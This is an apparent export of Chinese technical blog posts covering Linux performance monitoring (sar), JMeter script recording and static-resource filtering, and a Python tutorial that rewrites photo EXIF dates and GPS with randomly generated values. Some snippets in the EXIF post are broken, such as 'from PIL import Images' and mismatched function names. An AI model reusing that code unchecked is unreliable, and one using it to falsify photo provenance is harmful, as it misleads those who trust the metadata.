<img src="/p/f25d7b6e/image-20240111222146175.webp" alt="image-20240111222146175">
<figcaption aria-hidden="true">image-20240111222146175</figcaption>
</figure></li>
<li><p> 使用参数 <code>--top-cpu-adv</code>，实时监控当前时刻最耗 CPU 的进程名、进程标识符、CPU 占用率以及读写信息。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111222225646.webp" alt="image-20240111222225646">
<figcaption aria-hidden="true">image-20240111222225646</figcaption>
</figure></li>
<li><p> 使用参数 <code>--top-cputime</code>，实时监控当前时刻最耗 CPU 的进程名和对应的耗时时间（毫秒）。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111222346699.webp" alt="image-20240111222346699">
<figcaption aria-hidden="true">image-20240111222346699</figcaption>
</figure></li>
<li><p> 使用参数 <code>--top-latency</code>，实时监控当前时刻延迟最高的进程名和延迟时间（毫秒）。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111222519310.webp" alt="image-20240111222519310">
<figcaption aria-hidden="true">image-20240111222519310</figcaption>
</figure></li>
<li><p> 使用参数 <code>--top-mem</code>，实时监控当前时刻最耗内存的进程名和对应的进程占用。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111222746783.webp" alt="image-20240111222746783">
<figcaption aria-hidden="true">image-20240111222746783</figcaption>
</figure></li>
</ol>
<h2 id="sar工具">2.2. sar 工具</h2>
<p>sar（System Activity
Reporter），系统活动情况报告，可通过多个角度对系统的活动进行监控和报告，包括 CPU、磁盘 IO、系统调用情况、文件读写、内存使用等。sar 工具对系统当前的状态进行连续取样，通过计算后输出系统当前的运行状态。</p>
<p>在 Linux 终端通过 <code>apt install sysstat</code> 或 <code>yum install sysstat</code> 命令安装。</p>
<p>sar 命令的语法及参数含义如下所示。</p>
<p><code>sar [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]</code></p>
<p>其中，<code>options</code> 选项的常用参数如下所示，<code>interval</code> 选项表示样本采集的时间间隔，<code>count</code> 选项则表示采样次数。</p>
<ul>
<li><p><code>-r</code> 参数</p>
<p>输出系统内存使用状态信息。</p>
<p>每列含义依次是：内存空闲量、内存占用量、内存占用率、内存 buffer 占用、内存 cache 占用、系统所需内存量、系统所徐良与总内存占比。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111223537082.webp" alt="image-20240111223537082">
<figcaption aria-hidden="true">image-20240111223537082</figcaption>
</figure></li>
<li><p><code>-b</code> 参数</p>
<p>输出系统物理设备的 IO 传输速率信息。</p>
<p>每列含义依次是：每秒物理设备 IO 传输总量、每秒物理设备读取数据总量、每秒物理设备写入数据总量、每秒从物理设备读取的数据量（块 /s)、每秒从物理设备写入的数据量（块 /s）。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111223737669.webp" alt="image-20240111223737669">
<figcaption aria-hidden="true">image-20240111223737669</figcaption>
</figure></li>
<li><p><code>-d</code> 参数</p>
<p>输出系统每块设备的使用状态信息。</p>
<p>每列含义依次是：每秒从物理磁盘 IO 的次数、每秒扇区读取次数、每秒扇区写入次数、平均每次设备 IO 操作的数据大小、磁盘请求队列平均长度、请求磁盘操作到完成处理的平均耗时、每次请求的平均时间（不包含在队列中等待的时间）、IO 请求占 CPU 的百分比。</p>
<ul>
<li><code>%util</code> 占比越大，说明越饱和。</li>
<li><code>avgqu-sz</code> 值较低时，说明设备的利用率较高。</li>
</ul>
<figure>
<img src="/p/f25d7b6e/image-20240111224046343.webp" alt="image-20240111224046343">
<figcaption aria-hidden="true">image-20240111224046343</figcaption>
</figure></li>
</ul>
<!--2.3. nmon工具-->
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>性能监控工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】08. 性能测试技术历练篇之性能分析神器 JProfile</title>
    <url>/p/683c1dd9.html</url>
    <content><![CDATA[<p>分析性能瓶颈</p>
<p>基于 Java，层层分析每一个类或方法调用的耗时</p>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>性能分析工具</tag>
        <tag>JProfile</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】09. 性能测试技术历练篇之 Java 诊断工具 Arthas</title>
    <url>/p/bf4fa918.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>Arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】Jmeter 工具结合浏览器代理插件，录制性能测试脚本</title>
    <url>/p/c87e53d8.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在使用 Jmeter 工具执行性能测试的时候，头等大事就是要录制测试脚本，然后再根据录制到的请求，修改其中必要的参数，以及加入后置处理器等，直至能够完整无误的跑完整个流程。
  那么这篇博客，将详细介绍如何利用浏览器插件，完成测试脚本的录制。
<span id="more"></span></p>
<hr>
<h1 id="工具准备">2. 工具准备</h1>
<table>
<colgroup>
<col style="width: 2%">
<col style="width: 10%">
<col style="width: 87%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Jmeter </td>
<td><a href="https://mirrors.tuna.tsinghua.edu.cn/apache//jmeter/binaries/">官网页面</a>下载即可。运行需要 Java 环境，要求 Java
8 + 版本</td>
</tr>
<tr class="even">
<td> 2</td>
<td> 浏览器</td>
<td>可支持安装扩展插件的浏览器，例如 Chrome、Edge 等</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>Proxy SwitchyOmega</td>
<td> 代理插件，Edge 浏览器可直接从<a href="https://microsoftedge.microsoft.com/addons/detail/proxy-switchyomega/fdbloeknjpnloaggplaobopplkdhnikc?hl=zh-CN">扩展商店</a>中下载</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="代理插件配置">3. 代理插件配置</h1>
<ol type="1">
<li>安装后代理插件后，进入插件配置界面，新建一个情景模式。 &gt;
点击更改名称，取一个可识别的模式名称 &gt;
代理服务器：可填写 127.0.0.1 或本机局域网 IP 地址 &gt;
代理端口：可自定义，但需要注意不能与系统当前占用的端口 &gt;
不代理的地址列表：可留空，或根据需要，添加不需要被代理的域名（支持正则）</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U9a2cf4e69d4e421e99f3e1c5c3fb0b68G.jpg" alt="代理插件配置">
<figcaption aria-hidden="true">代理插件配置</figcaption>
</figure>
<ol start="2" type="1">
<li>点击浏览器右上的插件图标，选择上一步创建的情景模式，开启代理。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U8372df4f73694924a64979f59b5d0a98P.jpg" alt="开启浏览器代理">
<figcaption aria-hidden="true">开启浏览器代理</figcaption>
</figure>
<hr>
<h1 id="jmeter工具配置">4. Jmeter 工具配置</h1>
<ol type="1">
<li>打开 jmeter 工具，新建一个 <code>HTTP(S) Test Script Recorder</code>（中文环境：HTTP 代理服务器）。</li>
<li>在下图红框所示的 Port 中，填写上一步设定的代理端口。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U4872c759cbc045a788fb4bd8c09fbfafR.jpg" alt="Jmeter工具配置">
<figcaption aria-hidden="true">Jmeter 工具配置</figcaption>
</figure>
<ol start="3" type="1">
<li>点击 Start 按钮，开启 Jmeter 工具代理，此后浏览器所有经过代理的请求，均会被 Jmeter 记录。</li>
</ol>
<h1 id="录制脚本">5. 录制脚本</h1>
<ol type="1">
<li>在上述配置步骤完成后，现在就可以开始录制脚本了。</li>
<li>新建一个线程组，添加一个事务控制器并根据操作序列和对象命名，例如比较常见的：01.login。</li>
<li>回到 HTTP 代理服务器中，在如下图所示的<code>目标控制器</code>中，选择上一步添加的事务控制器，后续浏览器发送的请求，将会保存至这个事务控制器内。</li>
<li>后续再根据业务流程，添加<code>判断控制器</code>、<code>循环控制器</code>等其他元件，再按照第 2-3 步执行即可。</li>
</ol>
<p><img src="https://ae01.alicdn.com/kf/Ue292dc03a0e84520b00c3ecb60b6d9c8Y.jpg"></p>
<h1 id="效果">6. 效果</h1>
<ol type="1">
<li>以树莓派 Portainer 容器的登录操作为例，登录操作所有的请求及对应的参数，都已保存在了 <code>01.login</code> 这个事务控制器中。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/Ub3441646d65346bf89d808680d40a03bc.jpg" alt="脚本录制效果">
<figcaption aria-hidden="true">脚本录制效果</figcaption>
</figure>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>Jmeter</tag>
        <tag>测试脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】Jmeter 录制脚本时过滤静态资源</title>
    <url>/p/ba4396b6.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在调试性能测试脚本的时候，直接进行录制，会获取到大量的静态资源请求，这些静态资源请求，可能会由于项目升级或更新后，资源源地址发生变化，从而导致在跑性能脚本时，出现大量的 404 报错。同时每一次循环的访问静态资源，也增加了对服务器的资源消耗，进而影响了性能测试结果的准确性。
  所以，咱们在录制脚本之前，可以配置一下 jmeter 工具的过滤器，将不需要的一些静息资源请求过滤掉，只保留必要的数据处理类型的请求。</p>
<span id="more"></span>
<h1 id="配置步骤">2. 配置步骤</h1>
<ol type="1">
<li>打开 Jmeter 工具，右键 <code>Test Plan</code>，添加一个 <code>HTTP(S) Test Script Recorder</code>。此元件可用于浏览器代理，收集所有的网页请求。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U4668f74e37854db3a9b2a153d4892007x.jpg" alt="HTTP(S) Test Script Recorder">
<figcaption aria-hidden="true">HTTP(S) Test Script Recorder</figcaption>
</figure>
<ol start="2" type="1">
<li> 点击 <code>HTTP(S) Test Script Recorder</code>，切换到 <code>Requests Filtering</code> 页签。</li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/U23fe0c0d99fb40c6840a48053382e318T.jpg" alt="Requests Filtering">
<figcaption aria-hidden="true">Requests Filtering</figcaption>
</figure>
<ol start="3" type="1">
<li> 在 <code>URL Patterns to Exclude</code> 中，可自定义添加需要排除的资源格式，也可点击 <code>Add Suggested Excludes</code> 按钮，添加工具推荐的资源格式。
&gt; 其他参考 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(?i).*\.(bmp|css|js|gif|ico|jpe?g|png|swf|woff|woff2)</span><br><span class="line">.*\.js.*|.*\.css.*|.*\.html.*|.*\.jpg.*|.*\.ttf.*|.*\.png.*</span><br><span class="line">.*\.otf.*|.*\.cab.*|.*\.woff.*|.*\.woff2.*|.*\.swf.*|</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<figure>
<img src="https://ae01.alicdn.com/kf/Ua728b5b093814fff8ef6a1e9630561bdX.jpg" alt="URL Patterns to Exclude">
<figcaption aria-hidden="true">URL Patterns to Exclude</figcaption>
</figure>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>Jmeter</tag>
        <tag>测试脚本</tag>
        <tag>静态资源</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】利用 Python+pyexif 库获取以及修改照片 EXIF 信息</title>
    <url>/p/da16c9e5.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  在<a href="/p/c046778c.html">《【Python】基于 Windows 平台批量修改图片 EXIF 信息》</a>这篇博客中，简单介绍了下在 Windows 平台，如何利用 python 对照片进行修改时间等 exif 信息，其中用到的第三方库是 win32file 和 pywintypes，这两个库只能在 Windows 平台中使用，换到 macOS 或 Linux 平台，就无法使用了，具有一定的局限性。
  本篇博客，则基于 macOS 平台，通过利用 pyexif 库，重新编写代码，实现修改照片时间信息的功能；同时，还顺带介绍下如何获取照片中的 GPS 信息，并对其进行修改操作。</p>
<span id="more"></span>
<hr>
<h1 id="环境准备">2. 环境准备</h1>
<table>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>macOS</td>
<td> 我的是 macOS High Sierra 系统</td>
</tr>
<tr class="even">
<td> 2</td>
<td>Python</td>
<td>3.X 版本以上</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>piexif</td>
<td> 第三方库，通过 <code>pip install piexif</code> 命令安装即可</td>
</tr>
<tr class="even">
<td> 4</td>
<td>PIL</td>
<td> 第三方库，通过 <code>pip install pillow</code> 命令安装即可</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="复用代码">3. 复用代码</h1>
<p>  通过初步整理，<a href="/p/c046778c.html">《【Python】基于 Windows 平台批量修改图片 EXIF 信息》</a>和<a href="/p/528c0f55.html">《【Python】基于 generate_date 方法生成的日期结果离散性分析与优化》</a>博客的代码中，可直接复用如下两个方法。
1. 日期生成方法 generate_date () </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_date</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 计算出起止范围内的总天数</span></span><br><span class="line">    all_range_day_num = (end_date - start_date).days</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始日期 + 随机生成的天数</span></span><br><span class="line">    rand_day = random.randint(<span class="number">0</span>, all_range_day_num - <span class="number">1</span>)</span><br><span class="line">    n_days = start_date + timedelta(days=rand_day)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.date = n_days.date()</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.date</span><br></pre></td></tr></tbody></table></figure> 2.
时间生成方法generate_time() <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_time</span>(<span class="params">self</span>):</span><br><span class="line">    hour = random.randint(<span class="number">00</span>, <span class="number">23</span>)</span><br><span class="line">    minute = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line">    second = random.randint(<span class="number">00</span>, <span class="number">59</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.time = <span class="string">f'<span class="subst">{hour}</span>:<span class="subst">{minute}</span>:<span class="subst">{second}</span>'</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<hr>
<h1 id="实现代码">4. 实现代码</h1>
<h2 id="获取时间信息">4.1. 获取时间信息</h2>
<ol type="1">
<li>想要获取照片的 exif 中的信息，首先，需要通过 piexif 库中的 load 方法加载该照片，此时获取到的信息打印如下。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">exif_info = piexif.load(file_path)</span><br><span class="line"><span class="built_in">print</span>(exif_info)</span><br><span class="line">{<span class="string">'0th'</span>: {<span class="number">271</span>: <span class="string">b'Apple'</span>, <span class="number">272</span>: <span class="string">b'iPhone XR'</span>, <span class="number">274</span>: <span class="number">1</span>, <span class="number">282</span>: (<span class="number">72</span>, <span class="number">1</span>), <span class="number">283</span>: (<span class="number">72</span>, <span class="number">1</span>), <span class="number">296</span>: <span class="number">2</span>, <span class="number">305</span>: <span class="string">b'Photos 3.0'</span>, <span class="number">306</span>: <span class="string">b'2021:03:11 17:07:41'</span>, <span class="number">316</span>: <span class="string">b'iPhone XR'</span>, <span class="number">531</span>: <span class="number">1</span>, <span class="number">34665</span>: <span class="number">220</span>}, <span class="string">'Exif'</span>: {<span class="number">33434</span>: (<span class="number">1</span>, <span class="number">302</span>), <span class="number">33437</span>: (<span class="number">9</span>, <span class="number">5</span>), <span class="number">34850</span>: <span class="number">2</span>, <span class="number">34855</span>: <span class="number">25</span>, <span class="number">36864</span>: <span class="string">b'0232'</span>, <span class="number">36867</span>: <span class="string">b'2021:03:11 17:07:41'</span>, <span class="number">36868</span>: <span class="string">b'2021:03:11 17:07:41'</span>, <span class="number">37121</span>: <span class="string">b'\x01\x02\x03\x00'</span>, <span class="number">37377</span>: (<span class="number">28685</span>, <span class="number">3482</span>), <span class="number">37378</span>: (<span class="number">2159</span>, <span class="number">1273</span>), <span class="number">37379</span>: (<span class="number">4117</span>, <span class="number">553</span>), <span class="number">37380</span>: (<span class="number">0</span>, <span class="number">1</span>), <span class="number">37383</span>: <span class="number">5</span>, <span class="number">37385</span>: <span class="number">16</span>, <span class="number">37386</span>: (<span class="number">17</span>, <span class="number">4</span>), <span class="number">37396</span>: (<span class="number">2013</span>, <span class="number">1512</span>, <span class="number">2320</span>, <span class="number">1394</span>), <span class="number">37500</span>: <span class="string">b'Apple iOS\x00\x00\x01MM\x00\x00\x01\x00\t\x00\x00'</span>}</span><br></pre></td></tr></tbody></table></figure></li>
<li>到这里，生成了一个 dict 类型的 exif_info 变量，照片的所有属性信息都能在这里看到了，包括拍摄设备、拍摄时间、exif 信息、GPS 信息等一些二进制数据。</li>
<li>如果想要从 exif_info 中获取相应的时间，只需通过 piexif 中的 DateTime 固定变量即可，代码如下所示。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(exif_info[<span class="string">"0th"</span>][piexif.ImageIFD.DateTime])</span><br><span class="line"><span class="comment"># Out[16]: </span></span><br><span class="line"><span class="string">b'2021:03:11 17:07:41'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="修改时间信息">4.2. 修改时间信息</h2>
<ol type="1">
<li>如果要修改时间信息，只需将上一步中 exif_info 的 DateTime 变量值，重新给它一个指定的时间值即可，时间格式是 <code>yyyy-mm-dd hh24:MM:ss</code>。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">exif_info[<span class="string">"0th"</span>][piexif.ImageIFD.DateTime] = <span class="string">'2021-03-12 12:44:12'</span></span><br><span class="line"><span class="built_in">print</span>(exif_info[<span class="string">"0th"</span>][piexif.ImageIFD.DateTime])</span><br><span class="line"><span class="comment">#Out[18]: </span></span><br><span class="line"><span class="string">'2021-03-12 12:44:12'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="获取gps信息">4.3. 获取 GPS 信息</h2>
<ol type="1">
<li>获取照片中的 GPS 信息，读取的是 piexif 中的 GPSLatitude、GPSLongitude 等变量。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitudeRef]   <span class="comment"># 1.南北纬</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitude]      <span class="comment"># 2.纬度值</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitudeRef]  <span class="comment"># 3.东西经</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitude]     <span class="comment"># 4.经度值</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="修改gps信息">4.4. 修改 GPS 信息</h2>
<ol type="1">
<li>同理，修改 GPS 信息，只需 exif_info 中的 GPSLatitude、GPSLongitude 等变量重新赋值即可。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 将十进制的经纬度格式化成指定格式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_data</span>(<span class="params">latlong</span>):</span><br><span class="line">  degree = <span class="built_in">int</span>(latlong)</span><br><span class="line">  res_degree = latlong - degree</span><br><span class="line">  minute = <span class="built_in">int</span>(res_degree * <span class="number">60</span>)</span><br><span class="line">  res_minute = res_degree * <span class="number">60</span> - minute</span><br><span class="line">  seconds = <span class="built_in">round</span>(res_minute * <span class="number">60.0</span>, <span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">  _data = ((degree, <span class="number">1</span>), (minute, <span class="number">1</span>), (<span class="built_in">int</span>(seconds * <span class="number">1000</span>), <span class="number">1000</span>))</span><br><span class="line">        </span><br><span class="line">  <span class="keyword">return</span> _data</span><br><span class="line"></span><br><span class="line">latitude = <span class="variable language_">self</span>.format_data(info[<span class="number">0</span>])</span><br><span class="line">longitude = <span class="variable language_">self</span>.format_data(info[<span class="number">1</span>])</span><br><span class="line">gps_dict = {<span class="string">"lat"</span>: latitude, <span class="string">"lng"</span>: longitude, <span class="string">"lng_ref"</span>: <span class="string">'E'</span>, <span class="string">"lat_ref"</span>: <span class="string">'N'</span>}</span><br><span class="line"></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitudeRef] = gps_dict.get(<span class="string">'lat_ref'</span>)  <span class="comment"># 1.南北纬</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitude] = gps_dict.get(<span class="string">'lat'</span>)  <span class="comment"># 2.纬度值</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitudeRef] = gps_dict.get(<span class="string">'lng_ref'</span>)  <span class="comment"># 3.东西经</span></span><br><span class="line">exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitude] = gps_dict.get(<span class="string">'lng'</span>)  <span class="comment"># 4.经度值</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="保存修改">4.5. 保存修改</h2>
<ol type="1">
<li>以上的修改操作，仅仅是对 exif_info 这个 dict 变量进行修改，还没有真正的对照片起到修改效果。所以，咱们还需要通过 PIL 库中的 Images 类，将照片实例化成一个对象，然后通过 save () 方法，传入 exif_bytes 参数，即可完成照片的修改。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Images</span><br><span class="line"><span class="comment"># 将照片实例化</span></span><br><span class="line">img = Images(file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将以上修改的数据，加载二进制数据</span></span><br><span class="line">exif_bytes = piexif.dump(exif_info)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存照片对象</span></span><br><span class="line">img.save(file, exif=exif_bytes)</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="总体源码">5. 总体源码</h1>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modify_gps</span>(<span class="params">self, file</span>):</span><br><span class="line">    province_list = [</span><br><span class="line">        <span class="number">410000</span>, <span class="number">510000</span>, <span class="number">500000</span>, <span class="number">370000</span>, <span class="number">310000</span>, <span class="number">330000</span>, <span class="number">460000</span>, <span class="number">350000</span>, <span class="number">420000</span>, <span class="number">340000</span>,</span><br><span class="line">        <span class="number">120000</span>, <span class="number">530000</span>, <span class="number">230000</span>, <span class="number">440000</span>, <span class="number">430000</span>, <span class="number">130000</span>, <span class="number">220000</span>, <span class="number">320000</span>, <span class="number">110000</span>]</span><br><span class="line">    random.shuffle(province_list)</span><br><span class="line">    province_code = random.choice(province_list)</span><br><span class="line">    <span class="comment"># 获取该省任意一个城市的经纬度信息</span></span><br><span class="line">    info = get_city(province_code)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"{:60} | {:^25} | {:^25} | {:^20}"</span>.<span class="built_in">format</span>(file, info[<span class="number">0</span>], info[<span class="number">1</span>], <span class="built_in">str</span>(<span class="variable language_">self</span>.date)))</span><br><span class="line">    </span><br><span class="line">    file_path = os.path.join(root_path, file)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        img = Image.<span class="built_in">open</span>(file_path)</span><br><span class="line">        exif_info = piexif.load(file_path)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># GPS信息处理，格式化</span></span><br><span class="line">        latitude = <span class="variable language_">self</span>.format_latlng(info[<span class="number">0</span>])</span><br><span class="line">        longitude = <span class="variable language_">self</span>.format_latlng(info[<span class="number">1</span>])</span><br><span class="line">        gps_dict = {<span class="string">"lat"</span>: latitude, <span class="string">"lng"</span>: longitude, <span class="string">"lng_ref"</span>: <span class="string">'E'</span>, <span class="string">"lat_ref"</span>: <span class="string">'N'</span>}</span><br><span class="line">        </span><br><span class="line">        exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitudeRef] = gps_dict.get(<span class="string">'lat_ref'</span>)  <span class="comment"># 1.南北纬</span></span><br><span class="line">        exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLatitude] = gps_dict.get(<span class="string">'lat'</span>)  <span class="comment"># 2.纬度值</span></span><br><span class="line">        exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitudeRef] = gps_dict.get(<span class="string">'lng_ref'</span>)  <span class="comment"># 3.东西经</span></span><br><span class="line">        exif_info[<span class="string">'GPS'</span>][piexif.GPSIFD.GPSLongitude] = gps_dict.get(<span class="string">'lng'</span>)  <span class="comment"># 4.经度值</span></span><br><span class="line">        </span><br><span class="line">        exif_bytes = piexif.dump(exif_info)</span><br><span class="line">        img.save(file_path, exif=exif_bytes)</span><br><span class="line">        img.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log = <span class="string">f'失败文件：<span class="subst">{file_path}</span>, 错误信息：<span class="subst">{e}</span>'</span></span><br><span class="line">        <span class="variable language_">self</span>.write_log(log)</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>exif信息</tag>
        <tag>pyexif</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】利用 Python 解析 xml 文件，提取标签内指定信息</title>
    <url>/p/f9b01026.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  python 解析处理 xml 文件的接口都在 <code>xml</code> 标准库中，其中包含了如下六种子模块。本篇博客，将以模块中的 <code>xml.etree.ElementTree</code> 子模块，对 xml 文件进行解析，并提取其中想要的关键信息。
&gt; 引用于: https://docs.python.org/zh-cn/3/library/xml.html</p>
<span id="more"></span>
<ul>
<li>xml.etree.ElementTree： ElementTree
API，一个简单而轻量级的 XML 处理器</li>
<li> xml.dom：DOM API 定义</li>
<li> xml.dom.minidom：最小的 DOM 实现</li>
<li> xml.dom.pulldom：支持构建部分 DOM 树</li>
